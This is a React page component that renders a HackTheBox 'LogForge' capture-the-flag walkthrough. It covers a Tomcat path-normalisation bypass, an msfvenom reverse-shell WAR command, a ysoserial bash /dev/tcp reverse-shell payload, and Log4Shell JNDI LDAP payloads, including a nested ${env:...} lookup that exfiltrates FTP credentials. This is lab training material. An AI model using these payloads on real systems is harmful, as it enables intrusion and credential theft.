import {
  Container,
  Badge,
  Box,
  Link,
  List,
  ListItem,
  UnorderedList,
  Heading,
  useColorModeValue,
  Center,
  Image
} from '@chakra-ui/react'
import Layout from '../../components/layouts/article'
import { Title, Meta } from '../../components/work'
import P from '../../components/paragraph'

const Work = () => (
  <Layout title="Logforge_HTB">
    <Container>
      <Title>
        Logforge_HTB <Badge>2021</Badge>
      </Title>
      <Center my={6}>
        <Image src="/images/works/card.png" alt="icon" />
      </Center>
      <Heading as="h4" variant="section-title">Brief@logforge:~$</Heading>
      < P>HackThebox UHC (Ultimate Hacking championship) machine Logforge is all about exploring the different vulnerabilities in Apache server / Apache Tomcat. </P>
      <P>In this machine first we have to break the parser logic or path normalization, then test the tomcat manager for get shell using log4j JNDI exploit toolkit and serialised object payload created using ysoserial modified. After that for privesc we need to decompile the ftp-snapshot.jar for leaking out the ftp username and ftp password using nested JNDI and wireshark. </P>
      <Heading as="h4" variant="section-title">Recon</Heading>
      <UnorderedList my={4}>
      <Box
        borderRadius="lg"
        mb={6}
        p={3}
        textAlign="center"
        bg={useColorModeValue('whiteAlpha.400', 'whiteAlpha.400')}
      >
        <P>- Nmap 7.80 scan initiated Sat Dec 25 03:25:03 2021 as: nmap -sC -sV -oN nmap/result 10.10.11.138</P>
        <P>- Nmap scan report for 10.10.11.138</P>
        <P>- Host is up (0.55s latency).</P>
        <P>- Not shown: 996 closed ports</P>
        <P>- PORT     STATE    SERVICE    VERSION</P>
        <P>- 21/tcp   filtered ftp</P>
        <P>- 22/tcp   open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</P>
       <P> - 80/tcp   open     http       Apache httpd 2.4.41 ((Ubuntu))</P>
        <P>- |_http-server-header: Apache/2.4.41 (Ubuntu)</P>
        <P>- |_http-title: Ultimate Hacking Championship</P>
        <P>- 8080/tcp filtered http-proxy</P>
        <P>- Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</P>

        <P>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</P>
        <P>Nmap done at Sat Dec 25 03:26:27 2021 -- 1 IP address (1 host up) scanned in 84.23 seconds.</P>

      </Box> 
      <Image src="/images/works/nmap.png" alt="icon" />
      <br></br><P>-- There are 4 port&apos;s open i.e 21(ftp-filtered), 22(ssh), 80(Apache tomcat), 8080(reverse-proxy)</P>

      <Heading as="h4" variant="section-title">Port 80 (web app)</Heading>
       
      <br></br><Image src="/images/works/web.png" alt="icon" />
      <br></br><P>It&apos;s the simple banner of UHC competition.</P> 
      <P>let&apos;s try to get 404 error by passing arguments in the url bar.</P><br></br> 
      <Image src="/images/works/apache.png" alt="icon" />
      <P>The 404 page tells backend is running the Apache tomcat but the response header in the network tab tells that it is an Apache server (There is reverse proxy configured between port 80 and 8080)</P><br></br> 
      <Heading as="h4" variant="section-title">Breaking Parser Logic</Heading>
      <P>You can do it 2 ways:</P>
      <ListItem>By providing the name with /hackgod/..;/manager/ or by providing /;name=hackgod/manager/</ListItem>
      <ListItem>In this case you can provide (http://10.10.11.138/hackgod/..;/manager/) or (http://10.10.11.138/;name=hackgod/manager/)</ListItem>
      <P>Trailling slash or ending slash is most important in this case otherwise tomcat will not normalise the path you want.</P>
      <br></br><Image src="/images/works/manger.png" alt="icon" />
      <P>Now login with default tomcat creds i.e (tomcat :: tomcat), After logging you will be greeted with the manager page of tomcat.</P>
      <br></br><Image src="/images/works/tomcat.png" alt="icon" />
      </UnorderedList>
      
      
      <UnorderedList>
      <Heading as="h4" variant="section-title">Exploiting tomcat WebApp</Heading>
      <P>After getting the manager.html of apache tomcat, I always go for the war file deploy.</P>
      <P>WAR FILE: Tomcat uses WAR (Web Application Archive) files to deploy web apps via servlets. These files are similar to JAR files but contain everything the web app needs, such as JavaScript, CSS, etc. Previous versions of Apache Tomcat included a vulnerability that allowed attackers to upload and deploy a WAR backdoor.</P>
      <ListItem> I use MsfVenom for creating the war file for getting reverse shell on tomcat server.</ListItem>
      <br></br><Box
        borderRadius="lg"
        mb={6}
        p={3}
        textAlign="center"
        bg={useColorModeValue('whiteAlpha.400', 'whiteAlpha.400')}>
        msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PORT -f war -o shell.war
        </Box>
      <P>But in this case war is failed to deploy because tomcat is configured to deploy war under size of 1Bytes.</P>
      <ListItem> So let&apos;s test the tomcat manager for JNDI exploitation.</ListItem>
      <P>Starting the listner at port 8484 and throwing the classic jndi syntax.</P>
      <Image src="/images/works/listen.jpg" alt="icon" />
      <Heading as="h4" fontSize={18} my={6}>As you can we got a connection back from tomcat server. let&apos;s get a reverse connection back from tomcat.</Heading>

      <Heading as="h4" fontSize={18} my={6}>For getting reverse shell we need to make java serialised object that contain the reverse shell connection information and serialised objects magic bytes such (AD, ED)</Heading>
      <Heading as="h4" fontSize={18} my={6}>Tools needed to request reverse shell.</Heading>
      <Link href="https://github.com/pimps/ysoserial-modified">
          <ListItem>Ysoserial modified</ListItem>
          </Link>
      <Link href="https://github.com/pimps/JNDI-Exploit-Kit">
      <ListItem>JNDI-Exploit-Kit</ListItem>
          </Link>
      <Heading as="h4" fontSize={18} my={6}>Let&apos;s create the revese shell serialized object first using Ysoserial-Modified.</Heading>
      <Box
        borderRadius="lg"
        mb={6}
        p={3}
        textAlign="center"
        bg={useColorModeValue('whiteAlpha.400', 'whiteAlpha.400')}>
        java -jar ysoserial-modified.jar CommonsCollections5 bash &apos;bash -i &gt;& /dev/tcp/$IP/$PORT 0 &gt;&1&apos; &gt shell.ser
        </Box>
      <Image src="/images/works/serialised_objects.png" alt="icon" />
      <Heading as="h4" fontSize={18} my={6}>Now it&apos;s time for starting the JNDI exploit kit for creating jndi links and starting the ldap server at 1389.</Heading>
      <Box
        borderRadius="lg"
        mb={6}
        p={3}
        textAlign="center"
        bg={useColorModeValue('whiteAlpha.400', 'whiteAlpha.400')}>
        java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L $IP:1389 -P shell.ser
        </Box>
      <Image src="/images/works/jndi.png" alt="icon" />
      <br></br><P>Now just start copying the links from jndi links, and make ldap links to jndi format.</P>
      <Image src="/images/works/jndi_links.png" alt="icon" />
      <P>Wrap your created link using jndi-exploit-kit into this format. $&#123;jndi:ldap://$IP:1389//wndAp&#125;, now start your listner and paste the jndi link in tomcat server and get the reverse shell. as (tomcat@logforge$:)</P>
      <br></br><ListItem>JNDI LOG</ListItem>
      <br></br><Image src="/images/works/jndi_response.png" alt="icon" />
      <br></br><Image src="/images/works/shell.png" alt="icon" />
      <br></br><P>Now goto home directory an read the user.txt and submit and you captured the low level user on this box.</P>
      <Heading as="h4" variant="section-title">Privesc</Heading>
      <br></br><P>In the recon we find that the ftp port 21 is open but filtered so that, it can be accessed on local machine. so i tried (FTP localhost) but it is encrypted with username and password. </P>
      <Heading as="h4" fontSize={18} my={6}>In troubleshooting i found out that ftp server is also vulnerable to jndi.</Heading>
      <Heading as="h4" fontSize={18} my={6}>So i tried the classic jndi syntax in the username field of ftp server and got the connection back from ftp server. There is strange thing in the root directory (/), the snapshot.jar of ftp service that is running on port 21, so i transfer the snapshot to my local machine using nc.</Heading>
      <Image src="/images/works/listenftp.jpg" alt="icon" />
      
      <Heading as="h4" fontSize={18} my={6}>After decompiling the ftp-snapshot.jar, there is worker.java and server.java, and there are very special variables defined i.e ftp_user and ftp_password. So let&apos;s leak out these using jndi.</Heading>
      <Image src="/images/works/variables.png" alt="icon" />
      <ListItem>Start your wireshark on tun0 and start capturing the packet&apos;s.</ListItem>
      <ListItem>on ftp username field use the nested jndi for leaking out the ftp_user.</ListItem>
      <Box
        borderRadius="lg"
        mb={6}
        p={3}
        textAlign="center"
        bg={useColorModeValue('whiteAlpha.400', 'whiteAlpha.400')}>
        $&#123;jndi:ldap://$IP:1389/$&#123;env:ftp_user&#125;&#125;
        </Box>
      <Image src="/images/works/ftp_jndi.png" alt="icon" />
      <br></br>
      <ListItem>Filter out the tcp port in wireshark to 1389 using tcp.port == 1389.</ListItem>
      <ListItem>Right-click on captured packet and follow the tcp stream, you should see the ftp username.</ListItem>
      <Image src="/images/works/ftp-use.png" alt="icon" />
      <Heading as="h4" fontSize={18} my={6}>Gotcha, get the username FTP username :: ippsec. Repeat the same process for password but change the variable name to ftp_password.</Heading>
      <Image src="/images/works/ftp-pass.png" alt="icon" />
      <Heading as="h4" fontSize={18} my={6}>Creds ippsec :: log4j_env_leakage, now use these creds for logging in ftp server and get root.txt. </Heading>
      
      <Image src="/images/works/ftp-login.png" alt="icon" />
      <Heading as="h4" fontSize={18} my={6}>LogForge Rooted!!!</Heading>
      <Image src="/images/works/root.png" alt="icon" />
      </UnorderedList>
      <List ml={4} my={4}>
        <ListItem>
          <Meta>Tools used</Meta>
          <span>JNDI-Exploit-kit, Ysoserial-modified, Java-Gui.</span>
        </ListItem>
        <ListItem>
          <Meta>Achievement</Meta>
          <Link href="https://www.hackthebox.com/achievement/machine/480436/428">
            LogForge pwned!!
          </Link>
        </ListItem>
      </List>
      <P>If you like the walkthrough, then give respect on my hackthebox profile..!</P>
     
     </Container>
  </Layout>
)

export default Work
